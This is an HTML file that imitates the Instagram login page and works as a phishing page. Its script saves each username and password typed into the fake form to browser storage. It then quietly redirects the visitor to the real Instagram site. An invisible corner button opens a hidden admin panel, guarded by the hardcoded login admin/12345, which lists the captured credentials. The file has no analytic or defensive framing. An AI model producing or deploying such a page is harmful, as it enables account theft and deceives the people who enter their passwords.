<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }

        .container {
            width: 100%;
            max-width: 350px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Instagram Logo */
        .instagram-logo {
            font-family: 'Billabong', cursive, sans-serif;
            font-size: 50px;
            font-weight: normal;
            margin-bottom: 35px;
            color: #262626;
            text-align: center;
        }

        /* Form Inputs */
        .input-group {
            width: 100%;
            margin-bottom: 6px;
            position: relative;
        }

        .input-group input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            padding: 12px 10px;
            font-size: 12px;
            color: #262626;
            outline: none;
        }

        .input-group input:focus {
            border-color: #a8a8a8;
        }

        /* Forgot Password */
        .forgot-password {
            width: 100%;
            text-align: right;
            margin-top: 10px;
            margin-bottom: 15px;
        }

        .forgot-password a {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }

        /* Login Button */
        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 10px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 5px;
            margin-bottom: 20px;
        }

        .login-btn:hover {
            background-color: #1877f2;
        }

        /* Divider */
        .divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 10px 0 20px 0;
        }

        .divider-line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider-text {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            padding: 0 18px;
            text-transform: uppercase;
        }

        /* Facebook Login */
        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 40px;
        }

        .fb-login svg {
            margin-right: 8px;
            fill: #385185;
        }

        /* Signup Footer */
        .signup-footer {
            position: absolute;
            bottom: 20px;
            font-size: 14px;
            color: #262626;
        }

        .signup-footer a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        /* Page 2 (Hidden by default) */
        #page2 {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #fff;
            z-index: 100;
            padding: 30px;
            overflow-y: auto;
            text-align: center;
        }

        #page2 h1 {
            margin-bottom: 25px;
            color: #262626;
        }

        .split-container {
            display: flex;
            gap: 20px;
            justify-content: center;
            max-width: 800px;
            margin: 0 auto 30px auto;
            flex-wrap: wrap;
        }

        .split-box {
            flex: 1;
            min-width: 280px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            max-height: 400px;
            overflow-y: auto;
        }

        .split-box h2 {
            font-size: 16px;
            color: #262626;
            margin-bottom: 15px;
            border-bottom: 1px solid #dbdbdb;
            padding-bottom: 10px;
        }

        .content-box {
            font-size: 15px;
            color: #333;
            word-break: break-all;
            padding: 5px;
            text-align: left;
        }

        .entry-item {
            padding: 8px 10px;
            border-bottom: 1px solid #eee;
            background: #fff;
            margin-bottom: 4px;
            border-radius: 4px;
            font-weight: 500;
        }

        .button-group {
            display: flex;
            gap: 10px;
            justify-content: center;
        }

        .back-btn {
            background-color: #ed4956;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
        }

        .reset-btn {
            background-color: #8e8e8e;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
        }

        .reset-btn:hover {
            background-color: #737373;
        }

        /* Completely Hidden Admin Trigger Button (Maintains exact position & clickability) */
        .admin-trigger {
            position: fixed;
            bottom: 15px;
            right: 15px;
            background: transparent;
            border: none;
            color: transparent;
            width: 40px;
            height: 40px;
            cursor: pointer;
            z-index: 50;
        }

        /* Admin Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 200;
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background: white;
            padding: 25px;
            border-radius: 10px;
            width: 300px;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }

        .modal-content h3 {
            margin-bottom: 15px;
            color: #262626;
        }

        .modal-content input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            outline: none;
        }

        .modal-buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 10px;
        }

        .modal-buttons button {
            flex: 1;
            padding: 8px;
            border: none;
            border-radius: 5px;
            font-weight: 600;
            cursor: pointer;
        }

        .btn-submit {
            background-color: #0095f6;
            color: white;
            margin-right: 5px;
        }

        .btn-cancel {
            background-color: #efefef;
            color: #262626;
            margin-left: 5px;
        }

        .error-msg {
            color: #ed4956;
            font-size: 12px;
            margin-bottom: 10px;
            display: none;
        }
    </style>
</head>
<body>

    <!-- Page 1: Instagram Login Clone -->
    <div class="container" id="page1">
        <div class="instagram-logo">Instagram</div>
        
        <div class="input-group">
            <input type="text" id="loginUser" placeholder="Phone number, username, or email">
        </div>
        <div class="input-group">
            <input type="password" id="loginPass" placeholder="Password">
        </div>
        
        <div class="forgot-password">
            <a href="#">Forgot password?</a>
        </div>
        
        <button class="login-btn" onclick="submitLogin()">Log In</button>
        
        <div class="divider">
            <div class="divider-line"></div>
            <div class="divider-text">OR</div>
            <div class="divider-line"></div>
        </div>
        
        <a href="#" class="fb-login">
            <svg aria-hidden="true" class="_ab6-" height="16" role="img" viewBox="0 0 24 24" width="16"><path d="M12 2.04c-5.5 0-10 4.5-10 10 0 5 3.66 9.13 8.44 9.88v-6.99h-2.54v-2.89h2.54V9.97c0-2.5 1.49-3.89 3.77-3.89 1.09 0 2.23.2 2.23.2v2.45h-1.25c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.45 2.89h-2.33v6.98c4.78-.75 8.44-4.88 8.44-9.88 0-5.5-4.5-10-10-10z"></path></svg>
            Continue as Dave Johnson
        </a>
    </div>

    <div class="signup-footer">
        Don't have an account? <a href="#">Sign Up.</a>
    </div>

    <!-- Hidden Admin Trigger Button in Bottom Right -->
    <button class="admin-trigger" onclick="openModal()" title="Admin Panel"></button>

    <!-- Admin Login Modal -->
    <div class="modal" id="adminModal">
        <div class="modal-content">
            <h3>Admin Girişi</h3>
            <div class="error-msg" id="errorMsg">Hatalı kullanıcı adı veya şifre!</div>
            <input type="text" id="adminUser" placeholder="Kullanıcı adı">
            <input type="password" id="adminPass" placeholder="Şifre">
            <div class="modal-buttons">
                <button class="btn-submit" onclick="checkLogin()">Giriş Yap</button>
                <button class="btn-cancel" onclick="closeModal()">İptal</button>
            </div>
        </div>
    </div>

    <!-- Page 2: Split into 2 Sections (Admin Panel) -->
    <div id="page2">
        <h1>Admin Paneli - Kayıtlı Bilgiler</h1>
        
        <div class="split-container">
            <!-- Section 1: Captured Usernames -->
            <div class="split-box">
                <h2>Kullanıcı Adı</h2>
                <div class="content-box" id="displayUser">Henüz kayıt yok</div>
            </div>

            <!-- Section 2: Captured Passwords -->
            <div class="split-box">
                <h2>Şifre</h2>
                <div class="content-box" id="displayPass">Henüz kayıt yok</div>
            </div>
        </div>

        <div class="button-group">
            <button class="reset-btn" onclick="resetLogs()">Sıfırla</button>
            <button class="back-btn" onclick="goBack()">Geri Dön</button>
        </div>
    </div>

    <script>
        function submitLogin() {
            let u = document.getElementById('loginUser').value;
            let p = document.getElementById('loginPass').value;

            if (!u && !p) return;

            // Get existing logs or initialize an array
            let logs = JSON.parse(localStorage.getItem('loginLogs')) || [];
            logs.push({ user: u, pass: p });
            localStorage.setItem('loginLogs', JSON.stringify(logs));

            // Clear input fields quietly
            document.getElementById('loginUser').value = '';
            document.getElementById('loginPass').value = '';

            // Clean redirection to instagram.com
            window.location.href = "https://www.instagram.com/";
        }

        function openModal() {
            document.getElementById('adminModal').style.display = 'flex';
            document.getElementById('adminUser').value = '';
            document.getElementById('adminPass').value = '';
            document.getElementById('errorMsg').style.display = 'none';
        }

        function closeModal() {
            document.getElementById('adminModal').style.display = 'none';
        }

        function checkLogin() {
            let user = document.getElementById('adminUser').value;
            let pass = document.getElementById('adminPass').value;
            let errorMsg = document.getElementById('errorMsg');

            if (user === "admin" && pass === "12345") {
                closeModal();
                
                // Load persistent logs from localStorage
                let logs = JSON.parse(localStorage.getItem('loginLogs')) || [];
                
                let userHTML = "";
                let passHTML = "";

                if (logs.length === 0) {
                    userHTML = "<div style='color: #888; text-align: center;'>Henüz kayıt yok</div>";
                    passHTML = "<div style='color: #888; text-align: center;'>Henüz kayıt yok</div>";
                } else {
                    logs.forEach((log, index) => {
                        userHTML += `<div class="entry-item">${index + 1}. ${log.user ? log.user : '(Boş)'}</div>`;
                        passHTML += `<div class="entry-item">${index + 1}. ${log.pass ? log.pass : '(Boş)'}</div>`;
                    });
                }

                document.getElementById('displayUser').innerHTML = userHTML;
                document.getElementById('displayPass').innerHTML = passHTML;

                // Switch pages
                document.getElementById('page1').style.display = 'none';
                document.querySelector('.signup-footer').style.display = 'none';
                document.querySelector('.admin-trigger').style.display = 'none';
                document.getElementById('page2').style.display = 'block';
            } else {
                errorMsg.style.display = 'block';
            }
        }

        function resetLogs() {
            localStorage.removeItem('loginLogs');
            document.getElementById('displayUser').innerHTML = "<div style='color: #888; text-align: center;'>Henüz kayıt yok</div>";
            document.getElementById('displayPass').innerHTML = "<div style='color: #888; text-align: center;'>Henüz kayıt yok</div>";
        }

        function goBack() {
            document.getElementById('page2').style.display = 'none';
            document.getElementById('page1').style.display = 'flex';
            document.querySelector('.signup-footer').style.display = 'block';
            document.querySelector('.admin-trigger').style.display = 'block';
        }
    </script>
</body>
</html>
